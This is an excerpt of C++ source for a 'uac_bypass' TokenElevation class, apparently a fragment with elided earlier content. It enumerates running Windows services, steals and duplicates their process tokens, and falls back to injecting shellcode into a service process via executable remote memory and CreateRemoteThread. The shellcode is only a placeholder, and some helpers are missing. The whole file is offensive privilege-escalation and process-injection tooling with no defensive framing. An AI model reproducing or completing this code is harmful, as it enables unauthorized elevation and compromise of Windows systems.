#include "../include/TokenElevation.h"
[Previous content remains the same until findVulnerableService]

bool TokenElevation::findVulnerableService(std::wstring& serviceName) {
    SC_HANDLE hScm = OpenSCManagerW(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
    if (!hScm) return false;
    
    bool found = false;
    
    for (int i = 0; TARGET_SERVICES[i] != nullptr && !found; i++) {
        SC_HANDLE hService = OpenServiceW(hScm, TARGET_SERVICES[i], SERVICE_QUERY_STATUS);
        if (hService) {
            SERVICE_STATUS_PROCESS ssp;
            DWORD bytesNeeded;
            
            if (QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO,
                (LPBYTE)&ssp, sizeof(ssp), &bytesNeeded)) {
                if (ssp.dwCurrentState == SERVICE_RUNNING) {
                    serviceName = TARGET_SERVICES[i];
                    found = true;
                }
            }
            CloseServiceHandle(hService);
        }
    }
    
    CloseServiceHandle(hScm);
    return found;
}

bool TokenElevation::exploitService(const std::wstring& serviceName) {
    SC_HANDLE hScm = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hScm) return false;
    
    SC_HANDLE hService = OpenServiceW(hScm, serviceName.c_str(), SERVICE_ALL_ACCESS);
    if (!hService) {
        CloseServiceHandle(hScm);
        return false;
    }
    
    bool success = false;
    HANDLE hToken;
    
    // Try to extract token from service
    if (extractServiceToken(hService, hToken)) {
        if (duplicateAndModifyToken(hToken, currentToken)) {
            success = true;
        }
        CloseHandle(hToken);
    }
    
    // If token extraction fails, try injection
    if (!success) {
        success = injectIntoService(hService);
    }
    
    CloseServiceHandle(hService);
    CloseServiceHandle(hScm);
    
    return success;
}

bool TokenElevation::injectIntoService(HANDLE hService) {
    // Get service process ID
    SERVICE_STATUS_PROCESS ssp;
    DWORD bytesNeeded;
    
    if (!QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO,
        (LPBYTE)&ssp, sizeof(ssp), &bytesNeeded)) {
        return false;
    }
    
    // Open service process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ssp.dwProcessId);
    if (!hProcess) return false;
    
    // Inject payload into service
    SIZE_T payloadSize = 4096;  // Adjust based on actual payload
    LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, payloadSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    if (!remoteMem) {
        CloseHandle(hProcess);
        return false;
    }
    
    // Write payload code
    BYTE payload[] = {
        // Your payload shellcode here
        // This should be a minimal shellcode to elevate privileges
        0x90, 0x90, 0x90  // Example NOPs
    };
    
    if (!WriteProcessMemory(hProcess, remoteMem, payload,
        sizeof(payload), NULL)) {
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }
    
    // Create remote thread to execute payload
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);
    
    if (!hThread) {
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }
    
    // Wait for payload execution
    WaitForSingleObject(hThread, 5000);
    
    // Cleanup
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    
    return true;
}

bool TokenElevation::extractServiceToken(HANDLE hService, HANDLE& hToken) {
    SERVICE_STATUS_PROCESS ssp;
    DWORD bytesNeeded;
    
    if (!QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO,
        (LPBYTE)&ssp, sizeof(ssp), &bytesNeeded)) {
        return false;
    }
    
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE,
        ssp.dwProcessId);
    if (!hProcess) return false;
    
    bool success = OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY,
        &hToken);
    
    CloseHandle(hProcess);
    return success;
}

bool TokenElevation::impersonateToken(HANDLE hToken) {
    if (!ImpersonateLoggedOnUser(hToken)) {
        logger.logError(L"Impersonazione token fallita");
        return false;
    }
    
    logger.logInfo(L"Impersonazione token riuscita");
    return true;
}

} // namespace uac_bypass
